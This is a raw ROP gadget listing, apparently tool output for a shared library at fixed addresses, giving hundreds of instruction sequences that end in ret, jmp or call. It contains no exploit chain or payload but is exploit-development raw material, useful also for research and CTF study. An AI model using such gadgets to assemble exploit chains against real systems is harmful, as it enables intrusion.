0x00002aaaaab42d95 : test eax, eax ; je 0x6ddb3 ; mov rdi, qword ptr [rdi + 0xe0] ; jmp rax
0x00002aaaaab42e65 : test eax, eax ; je 0x6de83 ; mov rdi, qword ptr [rdi + 0xe0] ; jmp rax
0x00002aaaaab4d48d : test eax, eax ; je 0x7849d ; pop rbx ; ret
0x00002aaaaab52f84 : test eax, eax ; je 0x7df99 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab53072 : test eax, eax ; je 0x7e07c ; call rax
0x00002aaaaab599b9 : test eax, eax ; je 0x849c3 ; call rax
0x00002aaaaab5f970 : test eax, eax ; je 0x8a988 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab6abef : test eax, eax ; je 0x95c0b ; bsf eax, eax ; lea rax, qword ptr [rdi + rax] ; ret
0x00002aaaaab735fa : test eax, eax ; je 0x9e5da ; bsr eax, eax ; add rax, rdi ; ret
0x00002aaaaab8012d : test eax, eax ; je 0xab123 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9b9de : test eax, eax ; je 0xc6a00 ; mov rsi, rdi ; xor edi, edi ; call rax
0x00002aaaaaba07ef : test eax, eax ; je 0xcb7f9 ; call rax
0x00002aaaaaba09d1 : test eax, eax ; je 0xcb9de ; call rax
0x00002aaaaabd17ec : test eax, eax ; je 0xfc7f7 ; ret
0x00002aaaaabd3661 : test eax, eax ; je 0xfe670 ; mov qword ptr [rax], rdx ; ret
0x00002aaaaabdb7f2 : test eax, eax ; jl 0x10683b ; je 0x1067ff ; ret
0x00002aaaaaaff6e0 : test eax, eax ; jle 0x2a6f7 ; sub eax, 1 ; mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x00002aaaaabe8e53 : test eax, eax ; jne 0x113e6b ; cmp qword ptr [rdi], 0 ; je 0x113e73 ; ret
0x00002aaaaabe8ec6 : test eax, eax ; jne 0x113ed9 ; mov eax, 1 ; ret
0x00002aaaaabe8ef6 : test eax, eax ; jne 0x113f06 ; xor eax, eax ; ret
0x00002aaaaabe8f26 : test eax, eax ; jne 0x113f36 ; xor eax, eax ; ret
0x00002aaaaabe8f56 : test eax, eax ; jne 0x113f66 ; xor eax, eax ; ret
0x00002aaaaabe8f86 : test eax, eax ; jne 0x113f96 ; xor eax, eax ; ret
0x00002aaaaabe8fb6 : test eax, eax ; jne 0x113fc6 ; xor eax, eax ; ret
0x00002aaaaabe8fe6 : test eax, eax ; jne 0x113ff6 ; xor eax, eax ; ret
0x00002aaaaabe9016 : test eax, eax ; jne 0x114026 ; xor eax, eax ; ret
0x00002aaaaabe9046 : test eax, eax ; jne 0x114056 ; xor eax, eax ; ret
0x00002aaaaabe9076 : test eax, eax ; jne 0x114086 ; xor eax, eax ; ret
0x00002aaaaabe90a6 : test eax, eax ; jne 0x1140b6 ; xor eax, eax ; ret
0x00002aaaaabe90d6 : test eax, eax ; jne 0x1140e6 ; xor eax, eax ; ret
0x00002aaaaabe9106 : test eax, eax ; jne 0x114116 ; xor eax, eax ; ret
0x00002aaaaabe9136 : test eax, eax ; jne 0x114146 ; xor eax, eax ; ret
0x00002aaaaabe9166 : test eax, eax ; jne 0x114176 ; xor eax, eax ; ret
0x00002aaaaabe9196 : test eax, eax ; jne 0x1141a6 ; xor eax, eax ; ret
0x00002aaaaabe91c6 : test eax, eax ; jne 0x1141d6 ; xor eax, eax ; ret
0x00002aaaaabe91f6 : test eax, eax ; jne 0x114206 ; xor eax, eax ; ret
0x00002aaaaabe9226 : test eax, eax ; jne 0x114236 ; xor eax, eax ; ret
0x00002aaaaabe9256 : test eax, eax ; jne 0x114266 ; xor eax, eax ; ret
0x00002aaaaabe9286 : test eax, eax ; jne 0x114296 ; xor eax, eax ; ret
0x00002aaaaabe92e6 : test eax, eax ; jne 0x1142f6 ; xor eax, eax ; ret
0x00002aaaaabe9316 : test eax, eax ; jne 0x114326 ; xor eax, eax ; ret
0x00002aaaaabe9346 : test eax, eax ; jne 0x114356 ; xor eax, eax ; ret
0x00002aaaaabe9376 : test eax, eax ; jne 0x114386 ; xor eax, eax ; ret
0x00002aaaaabe93a6 : test eax, eax ; jne 0x1143b6 ; xor eax, eax ; ret
0x00002aaaaabe93d6 : test eax, eax ; jne 0x1143e6 ; xor eax, eax ; ret
0x00002aaaaabe9406 : test eax, eax ; jne 0x114416 ; xor eax, eax ; ret
0x00002aaaaabe9436 : test eax, eax ; jne 0x114446 ; xor eax, eax ; ret
0x00002aaaaabe9466 : test eax, eax ; jne 0x114476 ; xor eax, eax ; ret
0x00002aaaaabe94b0 : test eax, eax ; jne 0x1144ab ; pop rdx ; pop r10 ; ret
0x00002aaaaabe95a3 : test eax, eax ; jne 0x1145b5 ; ret
0x00002aaaaabe9945 : test eax, eax ; jne 0x1148e9 ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaabfcb8a : test eax, eax ; jne 0x127b94 ; ret
0x00002aaaaac01cfb : test eax, eax ; jne 0x12cd4a ; mov dword ptr [rsi], 0 ; ret
0x00002aaaaac025b3 : test eax, eax ; jne 0x12d5ca ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaac07456 : test eax, eax ; jne 0x132464 ; ret
0x00002aaaaac0d335 : test eax, eax ; jne 0x138325 ; pop rbx ; ret
0x00002aaaaac0d5b6 : test eax, eax ; jne 0x1385c4 ; ret
0x00002aaaaac152ba : test eax, eax ; jne 0x1402cf ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac187c6 : test eax, eax ; jne 0x1437d6 ; xor eax, eax ; ret
0x00002aaaaac187f6 : test eax, eax ; jne 0x143806 ; xor eax, eax ; ret
0x00002aaaaac18826 : test eax, eax ; jne 0x143836 ; xor eax, eax ; ret
0x00002aaaaac18856 : test eax, eax ; jne 0x143866 ; xor eax, eax ; ret
0x00002aaaaac18886 : test eax, eax ; jne 0x143896 ; xor eax, eax ; ret
0x00002aaaaac188b6 : test eax, eax ; jne 0x1438c6 ; xor eax, eax ; ret
0x00002aaaaac485f6 : test eax, eax ; jne 0x173622 ; mov rdi, qword ptr [r13] ; call 0x1f8b2
0x00002aaaaac488a6 : test eax, eax ; jne 0x1738b5 ; ret
0x00002aaaaab0a306 : test eax, eax ; jne 0x35315 ; ret
0x00002aaaaab3fcbf : test eax, eax ; jne 0x6acd8 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab51844 : test eax, eax ; jne 0x7c83d ; ret
0x00002aaaaab528d5 : test eax, eax ; jne 0x7d90a ; xor edi, edi ; call qword ptr [r15]
0x00002aaaaab5da1f : test eax, eax ; jne 0x88a15 ; ret
0x00002aaaaab61c5c : test eax, eax ; jne 0x8cc26 ; add rsp, 8 ; ret
0x00002aaaaab61c7f : test eax, eax ; jne 0x8cc98 ; add rsp, 8 ; ret
0x00002aaaaab62f67 : test eax, eax ; jne 0x8dfc7 ; xor rax, rax ; ret
0x00002aaaaab62f27 : test eax, eax ; jne 0x8dfeb ; xor rax, rax ; ret
0x00002aaaaab734db : test eax, eax ; jne 0x9e56a ; xor eax, eax ; ret
0x00002aaaaab73518 : test eax, eax ; jne 0x9e596 ; xor eax, eax ; ret
0x00002aaaaab80a71 : test eax, eax ; jne 0xaba45 ; ret
0x00002aaaaab80b2a : test eax, eax ; jne 0xabb26 ; xor eax, eax ; ret
0x00002aaaaabcfaed : test eax, eax ; jne 0xfaa98 ; mov edi, ebp ; call 0xf6d08
0x00002aaaaabd250f : test eax, eax ; jne 0xfd4e7 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd26d0 : test eax, eax ; jne 0xfd6a7 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd2072 : test eax, eax ; jns 0xfd084 ; mov byte ptr [rbx], 0 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaac150b1 : test eax, eax ; js 0x1400ca ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4aadb : test eax, eax ; js 0x75aed ; ret
0x00002aaaaab59c66 : test eax, eax ; js 0x84c75 ; ret
0x00002aaaaabd1309 : test eax, eax ; js 0xfc2df ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab8049d : test eax, eax ; mov dword ptr [rcx + 4], r8d ; jne 0xab471 ; ret
0x00002aaaaab80e83 : test eax, eax ; mov dword ptr [rdi + 8], eax ; je 0xabe42 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab6bdb3 : test eax, eax ; mov rax, rdx ; cmove rax, rbx ; pop rbx ; ret
0x00002aaaaac026b8 : test eax, eax ; mov rbx, rax ; jne 0x12d65c ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabff406 : test eax, eax ; sete al ; add rsp, 8 ; ret
0x00002aaaaab40347 : test eax, eax ; setne al ; movzx eax, al ; neg eax ; pop rbx ; ret
0x00002aaaaaaf7d7a : test eax, ecx ; add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaabb8a05 : test eax, edx ; add byte ptr [rax], al ; add dh, dh ; ret 0x7408
0x00002aaaaabebcf8 : test ebp, ebp ; jne 0x116d12 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac4854e : test ebp, ebp ; jne 0x173532 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabc3d39 : test ebp, ebp ; jne 0xeed2b ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab83025 : test ebp, ebp ; mov r13, r15 ; setne dl ; jmp 0xae03f
0x00002aaaaab85946 : test ebp, ebp ; mov r13, r15 ; setne dl ; jmp 0xb095f
0x00002aaaaab880fd : test ebp, ebp ; mov r13, r15 ; setne dl ; jmp 0xb311f
0x00002aaaaab62e90 : test ebp, ebx ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x00002aaaaab58f07 : test ebp, esp ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaabd7556 : test ebx, ebx ; jne 0x102542 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaab0f61a : test ebx, ebx ; jne 0x3a5ea ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4d15e : test ebx, ebx ; jne 0x78178 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab80b86 : test ebx, ebx ; jne 0xabb68 ; mov rax, rdi ; ret
0x00002aaaaac484f8 : test ebx, ebx ; mov rdi, rbx ; jne 0x1734f3 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac48984 : test ebx, ebx ; mov rdx, rbx ; jne 0x173981 ; pop rbx ; ret
0x00002aaaaac44d62 : test ebx, ecx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x00002aaaaac44d6f : test ebx, esp ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7540
0x00002aaaaab00394 : test ecx, ecx ; je 0x2b39e ; call rcx
0x00002aaaaab40458 : test ecx, ecx ; je 0x6b465 ; ret
0x00002aaaaab80a5b : test ecx, ecx ; jne 0xaba55 ; ret
0x00002aaaaab81ed9 : test ecx, ecx ; jne 0xace98 ; mov rax, rdx ; ret
0x00002aaaaab7f263 : test ecx, ecx ; mov dword ptr [rdx], ecx ; jne 0xaa25f ; ret
0x00002aaaaaad8953 : test ecx, edi ; adc byte ptr [rdx + 0x71], bh ; xchg eax, ebx ; and cl, ah ; ret
0x00002aaaaabb7702 : test ecx, esp ; add eax, 0x83410000 ; cld ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xb60f
0x00002aaaaac69381 : test edi, ebx ; jmp qword ptr [rax + 0x20fffb86]
0x00002aaaaac0865d : test edi, edi ; je 0x133674 ; call 0x1f8ae
0x00002aaaaab5bcf0 : test edi, edi ; je 0x86d09 ; mov eax, 0x16 ; ret
0x00002aaaaabf4191 : test edi, edi ; jne 0x11f185 ; pop rbx ; ret
0x00002aaaaabfcbca : test edi, edi ; jne 0x127bc2 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac4868b : test edi, edi ; jne 0x17367f ; pop rbx ; ret
0x00002aaaaabed7c2 : test edi, edi ; js 0x1187db ; mov eax, edi ; and eax, 0xffffff ; ret
0x00002aaaaabed842 : test edi, edi ; js 0x118859 ; mov eax, edi ; shr eax, 0x18 ; ret
0x00002aaaaaba2040 : test edi, edi ; mov eax, 1 ; js 0xcd05a ; ret
0x00002aaaaac6a26d : test edi, esp ; call qword ptr [rax + 0x20fffc84]
0x00002aaaaac6a9e1 : test edi, esp ; call rax
0x00002aaaaac6a0ad : test edi, esp ; call rsi
0x00002aaaaac6a269 : test edi, esp ; inc dword ptr [rax] ; test edi, esp ; call qword ptr [rax + 0x20fffc84]
0x00002aaaaac6a0a9 : test edi, esp ; inc dword ptr [rsi - 0x7b] ; cld ; call rsi
0x00002aaaaac02250 : test edx, edx ; je 0x12d260 ; mov rdi, rbp ; call rdx
0x00002aaaaac1eb8f : test edx, edx ; je 0x149b7a ; movsxd rax, ecx ; add rax, rdi ; ret
0x00002aaaaac48274 : test edx, edx ; je 0x17327e ; call rdx
0x00002aaaaab4c81a : test edx, edx ; je 0x77831 ; mov eax, 0xffffffff ; ret
0x00002aaaaab4c819 : test edx, edx ; je 0x77832 ; mov eax, 0xffffffff ; ret
0x00002aaaaab4cb9a : test edx, edx ; je 0x77bb1 ; mov eax, 0xffffffff ; ret
0x00002aaaaab4cb99 : test edx, edx ; je 0x77bb2 ; mov eax, 0xffffffff ; ret
0x00002aaaaab5fba2 : test edx, edx ; je 0x8abb0 ; bsf eax, edx ; ret
0x00002aaaaab5fba2 : test edx, edx ; je 0x8abb1 ; bsf eax, edx ; ret
0x00002aaaaab5fc4b : test edx, edx ; je 0x8ac67 ; bsf rax, rdx ; ret
0x00002aaaaab5fc4b : test edx, edx ; je 0x8ac68 ; bsf rax, rdx ; ret
0x00002aaaaab5fbea : test edx, edx ; je 0x8ac7b ; bsf rax, rdx ; ret
0x00002aaaaab5fe1a : test edx, edx ; je 0x8ae47 ; bsf rax, rdx ; ret
0x00002aaaaab5fe1a : test edx, edx ; je 0x8ae48 ; bsf rax, rdx ; ret
0x00002aaaaab5fdaa : test edx, edx ; je 0x8ae5b ; bsf rax, rdx ; ret
0x00002aaaaaba0940 : test edx, edx ; je 0xcb94d ; call rdx
0x00002aaaaabe97ed : test edx, edx ; jne 0x1147e9 ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaac10890 : test edx, edx ; jne 0x13b8a9 ; mov eax, 1 ; ret
0x00002aaaaac108d0 : test edx, edx ; jne 0x13b8e9 ; mov eax, 1 ; ret
0x00002aaaaab46bff : test edx, edx ; jne 0x71bf5 ; ret
0x00002aaaaab4f393 : test edx, edx ; jne 0x7a3a4 ; ret
0x00002aaaaab4ff3f : test edx, edx ; jne 0x7af35 ; ret
0x00002aaaaab5dac9 : test edx, edx ; jne 0x88ac5 ; ret
0x00002aaaaab81f1a : test edx, edx ; jne 0xacf15 ; ret
0x00002aaaaaaf548e : test edx, edx ; jns 0x20382 ; jmp 0x20463
0x00002aaaaab80d9f : test edx, edx ; mov dword ptr [rax], edx ; jne 0xabd9f ; ret
0x00002aaaaab8f69f : test edx, edx ; mov dword ptr [rsi + rcx], edx ; jne 0xba6a0 ; ret
0x00002aaaaab0b26a : test edx, edx ; sete al ; ret
0x00002aaaaac44d55 : test edx, esi ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x00002aaaaab5aa93 : test esi, eax ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaac857b1 : test esi, ebp ; jmp rax
0x00002aaaaac5cb3d : test esi, ebx ; call qword ptr [rax]
0x00002aaaaab5fd11 : test esi, esi ; jne 0x8ad20 ; xor rax, rax ; ret
0x00002aaaaab6af3e : test esi, esi ; jne 0x95f51 ; jmp 0x95f0b
0x00002aaaaaaff690 : test esi, esi ; push rbx ; je 0x2a6ab ; cmp esi, 3 ; je 0x2a6ab ; pop rbx ; ret
0x00002aaaaac7f684 : test qword ptr [rax], -0xdd3b800 ; jmp rcx
0x00002aaaaab0af22 : test qword ptr [rdi + rcx*8], rax ; setne al ; movzx eax, al ; ret
0x00002aaaaab0b105 : test qword ptr [rdi], rax ; setne al ; movzx eax, al ; ret
0x00002aaaaab80b85 : test r11d, r11d ; jne 0xabb69 ; mov rax, rdi ; ret
0x00002aaaaac6a0ac : test r15d, esp ; call rsi
0x00002aaaaabe9944 : test r8, r8 ; jne 0x1148ea ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaab72fd1 : test r8b, r8b ; jne 0x9dfb6 ; ret
0x00002aaaaab7310f : test r8b, r8b ; jne 0x9e0f7 ; xor eax, eax ; ret
0x00002aaaaac19e52 : test r8d, r8d ; je 0x144e60 ; xchg eax, edx ; sub eax, edx ; ret
0x00002aaaaac1ae37 : test r8d, r8d ; je 0x145e45 ; xchg eax, edx ; sub eax, edx ; ret
0x00002aaaaab80a70 : test r8d, r8d ; jne 0xaba46 ; ret
0x00002aaaaab8049c : test r8d, r8d ; mov dword ptr [rcx + 4], r8d ; jne 0xab472 ; ret
0x00002aaaaab81ed8 : test r9d, r9d ; jne 0xace99 ; mov rax, rdx ; ret
0x00002aaaaab9084e : test rax, rax ; cmove rax, rdx ; add rsp, 0x28 ; ret
0x00002aaaaabd982b : test rax, rax ; je 0x1048d1 ; call rax
0x00002aaaaabd99a2 : test rax, rax ; je 0x104aa9 ; call rax
0x00002aaaaabe9987 : test rax, rax ; je 0x114995 ; ret
0x00002aaaaabe9c7f : test rax, rax ; je 0x114cb5 ; call rax
0x00002aaaaabebaa9 : test rax, rax ; je 0x116ac1 ; add rsp, 8 ; ret
0x00002aaaaabf3eb4 : test rax, rax ; je 0x11eec6 ; mov rdi, rbx ; call rax
0x00002aaaaabf41ac : test rax, rax ; je 0x11f1be ; mov rdi, rbx ; call rax
0x00002aaaaabff450 : test rax, rax ; je 0x12a440 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabffc90 : test rax, rax ; je 0x12aca2 ; mov rdi, rsp ; call rax
0x00002aaaaabffd7b : test rax, rax ; je 0x12ad8d ; mov rdi, rsp ; call rax
0x00002aaaaac00631 : test rax, rax ; je 0x12b643 ; mov rdi, rbp ; call rax
0x00002aaaaac016c2 : test rax, rax ; je 0x12c6d4 ; mov rdi, r14 ; call rax
0x00002aaaaac07057 : test rax, rax ; je 0x132069 ; mov rdi, r12 ; call rax
0x00002aaaaac07238 : test rax, rax ; je 0x13224c ; lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac08512 : test rax, rax ; je 0x133524 ; mov rdi, r13 ; call rax
0x00002aaaaac08705 : test rax, rax ; je 0x133717 ; mov rdi, rbp ; call rax
0x00002aaaaac08925 : test rax, rax ; je 0x133937 ; mov rdi, rbp ; call rax
0x00002aaaaac0941c : test rax, rax ; je 0x134430 ; lea rdi, qword ptr [rbx + 0x68] ; call rax
0x00002aaaaac09ac8 : test rax, rax ; je 0x134ada ; mov rdi, r12 ; call rax
0x00002aaaaac09e3c : test rax, rax ; je 0x134e50 ; lea rdi, qword ptr [rbx + 0x58] ; call rax
0x00002aaaaac0c6c7 : test rax, rax ; je 0x13765b ; mov qword ptr fs:[rbx], rax ; pop rbx ; ret
0x00002aaaaac0c64c : test rax, rax ; je 0x13765e ; pop rbx ; ret
0x00002aaaaac0d3b8 : test rax, rax ; je 0x1383cc ; lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac0dad1 : test rax, rax ; je 0x138ae5 ; lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac4838b : test rax, rax ; je 0x17339c ; call rax
0x00002aaaaab00022 : test rax, rax ; je 0x2b02e ; call rax
0x00002aaaaab01378 : test rax, rax ; je 0x2c384 ; call rax
0x00002aaaaab4d48c : test rax, rax ; je 0x7849e ; pop rbx ; ret
0x00002aaaaab52f83 : test rax, rax ; je 0x7df9a ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab53071 : test rax, rax ; je 0x7e07d ; call rax
0x00002aaaaab599b8 : test rax, rax ; je 0x849c4 ; call rax
0x00002aaaaab5f96f : test rax, rax ; je 0x8a989 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9b9dd : test rax, rax ; je 0xc6a01 ; mov rsi, rdi ; xor edi, edi ; call rax
0x00002aaaaaba07ee : test rax, rax ; je 0xcb7fa ; call rax
0x00002aaaaaba09d0 : test rax, rax ; je 0xcb9df ; call rax
0x00002aaaaabd17eb : test rax, rax ; je 0xfc7f8 ; ret
0x00002aaaaabd3660 : test rax, rax ; je 0xfe671 ; mov qword ptr [rax], rdx ; ret
0x00002aaaaabdb7f1 : test rax, rax ; jl 0x10683c ; je 0x106800 ; ret
0x00002aaaaac0d334 : test rax, rax ; jne 0x138326 ; pop rbx ; ret
0x00002aaaaab51843 : test rax, rax ; jne 0x7c83e ; ret
0x00002aaaaab528d4 : test rax, rax ; jne 0x7d90b ; xor edi, edi ; call qword ptr [r15]
0x00002aaaaab5da1e : test rax, rax ; jne 0x88a16 ; ret
0x00002aaaaabd250e : test rax, rax ; jne 0xfd4e8 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd26cf : test rax, rax ; jne 0xfd6a8 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab6bdb2 : test rax, rax ; mov rax, rdx ; cmove rax, rbx ; pop rbx ; ret
0x00002aaaaac026b7 : test rax, rax ; mov rbx, rax ; jne 0x12d65d ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabff405 : test rax, rax ; sete al ; add rsp, 8 ; ret
0x00002aaaaabebcf7 : test rbp, rbp ; jne 0x116d13 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac4854d : test rbp, rbp ; jne 0x173533 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd7555 : test rbx, rbx ; jne 0x102543 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaab0f619 : test rbx, rbx ; jne 0x3a5eb ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4d15d : test rbx, rbx ; jne 0x78179 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac48983 : test rbx, rbx ; mov rdx, rbx ; jne 0x173982 ; pop rbx ; ret
0x00002aaaaab00393 : test rcx, rcx ; je 0x2b39f ; call rcx
0x00002aaaaac0865c : test rdi, rdi ; je 0x133675 ; call 0x1f8af
0x00002aaaaabf4190 : test rdi, rdi ; jne 0x11f186 ; pop rbx ; ret
0x00002aaaaabf418f : test rdi, rdi ; jne 0x11f187 ; pop rbx ; ret
0x00002aaaaabfcbc9 : test rdi, rdi ; jne 0x127bc3 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac4868a : test rdi, rdi ; jne 0x173680 ; pop rbx ; ret
0x00002aaaaac0224f : test rdx, rdx ; je 0x12d261 ; mov rdi, rbp ; call rdx
0x00002aaaaac48273 : test rdx, rdx ; je 0x17327f ; call rdx
0x00002aaaaab5fc4a : test rdx, rdx ; je 0x8ac68 ; bsf rax, rdx ; ret
0x00002aaaaab5fc4a : test rdx, rdx ; je 0x8ac69 ; bsf rax, rdx ; ret
0x00002aaaaab5fe19 : test rdx, rdx ; je 0x8ae48 ; bsf rax, rdx ; ret
0x00002aaaaab5fe19 : test rdx, rdx ; je 0x8ae49 ; bsf rax, rdx ; ret
0x00002aaaaaba093f : test rdx, rdx ; je 0xcb94e ; call rdx
0x00002aaaaabe97ec : test rdx, rdx ; jne 0x1147ea ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaab46bfe : test rdx, rdx ; jne 0x71bf6 ; ret
0x00002aaaaab4f392 : test rdx, rdx ; jne 0x7a3a5 ; ret
0x00002aaaaab4ff3e : test rdx, rdx ; jne 0x7af36 ; ret
0x00002aaaaab5dac8 : test rdx, rdx ; jne 0x88ac6 ; ret
0x00002aaaaab5fd10 : test rsi, rsi ; jne 0x8ad21 ; xor rax, rax ; ret
0x00002aaaaab6af3d : test rsi, rsi ; jne 0x95f52 ; jmp 0x95f0c
0x00002aaaaab5ba50 : test sil, 7 ; mov eax, 0x16 ; je 0x86a6b ; ret
0x00002aaaaab7316f : test sil, sil ; jne 0x9e168 ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaaaf8b84 : test sil, sil ; mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x00002aaaaaad7b82 : test word ptr [rbx - 0x2e], bp ; cmp dl, byte ptr [rdi] ; ret
0x00002aaaaab99a49 : vcmptruepd xmm15, xmm10, xmmword ptr [rax] ; ret 0x144
0x00002aaaaab4e945 : vminsd xmm8, xmm4, qword ptr [rcx + 0x5c] ; ret
0x00002aaaaab73fca : vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00002aaaaac22215 : vmovdqu xmmword ptr [rax + 0x60], xmm11 ; vmovdqu xmmword ptr [rax + 0x70], xmm12 ; ret
0x00002aaaaac2221a : vmovdqu xmmword ptr [rax + 0x70], xmm12 ; ret
0x00002aaaaac22150 : vmovdqu xmmword ptr [rcx - 0x10], xmm12 ; ret
0x00002aaaaac2214b : vmovdqu xmmword ptr [rcx - 0x20], xmm11 ; vmovdqu xmmword ptr [rcx - 0x10], xmm12 ; ret
0x00002aaaaac21f19 : vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm7 ; ret
0x00002aaaaab73fc6 : vmovdqu xmmword ptr [rdi], xmm0 ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00002aaaaac21f2a : vmovdqu xmmword ptr [rdi], xmm0 ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm7 ; ret
0x00002aaaaab7ea25 : vmovdqu xmmword ptr [rdi], xmm0 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaac2205f : vmovdqu xmmword ptr [rdx - 0x10], xmm12 ; mov rax, r8 ; ret
0x00002aaaaac21e83 : vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac21ee6 : vmovdqu xmmword ptr [rdx - 0x10], xmm7 ; ret
0x00002aaaaac21e7e : vmovdqu xmmword ptr [rdx - 0x20], xmm14 ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac21ee1 : vmovdqu xmmword ptr [rdx - 0x20], xmm6 ; vmovdqu xmmword ptr [rdx - 0x10], xmm7 ; ret
0x00002aaaaab7ea29 : vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaac46df5 : vmovdqu xmmword ptr [rsi - 0x20], xmm0 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaab73fb6 : vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x00002aaaaab73f9d : vmovdqu ymmword ptr [r9 - 0x20], ymm3 ; ret
0x00002aaaaab73fb2 : vmovdqu ymmword ptr [rdi], ymm0 ; vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x00002aaaaab7ea1b : vmovdqu ymmword ptr [rdi], ymm2 ; vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x00002aaaaac46ef1 : vmovdqu ymmword ptr [rsi - 0x20], ymm0 ; sub rax, rdx ; vzeroupper ; ret
0x00002aaaaab7ea1f : vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x00002aaaaab7ea34 : vmovq qword ptr [rdi], xmm0 ; vmovq qword ptr [rsi - 8], xmm0 ; ret
0x00002aaaaab7ea38 : vmovq qword ptr [rsi - 8], xmm0 ; ret
0x00002aaaaab742d3 : vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x00002aaaaab7416c : vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x00002aaaaab73f6e : vmovups zmmword ptr [r9 - 0x40], zmm3 ; ret
0x00002aaaaab73f32 : vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x00002aaaaab74435 : vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x00002aaaaab7ebd8 : vmovups zmmword ptr [rsi + 0x1c0], zmm2 ; ret
0x00002aaaaab7eb3b : vmovups zmmword ptr [rsi + 0xc0], zmm2 ; ret
0x00002aaaaab7e9da : vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x00002aaaaac0c7db : vpaddw xmm7, xmm15, xmm7 ; add eax, dword ptr [rax] ; add byte ptr [rcx + rcx*4 + 0x24], cl ; ret 0x8e0f
0x00002aaaaac1ee81 : vpcmpeqb xmm0, xmm0, xmm1 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaab079d5 : vpsubsb xmm10, xmm15, xmmword ptr [rcx + rax*4 + 0x29480005] ; ret
0x00002aaaaab6d614 : vpsubusw xmm8, xmm14, xmmword ptr [r13 - 0x77] ; ret 0x1374
0x00002aaaaac46ef9 : vzeroupper ; ret
0x00002aaaaac6b6a5 : wait ; add byte ptr [rax], al ; jmp 0x1966b1
0x00002aaaaac79a5d : wait ; add byte ptr [rax], al ; mov al, 0xf0 ; in eax, dx ; call rsi
0x00002aaaaabf3eb1 : wait ; add byte ptr [rax], al ; test rax, rax ; je 0x11eec9 ; mov rdi, rbx ; call rax
0x00002aaaaac822e1 : wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac48d09 : wait ; mov ebx, 0x1f0fffea ; add bl, dh ; ret
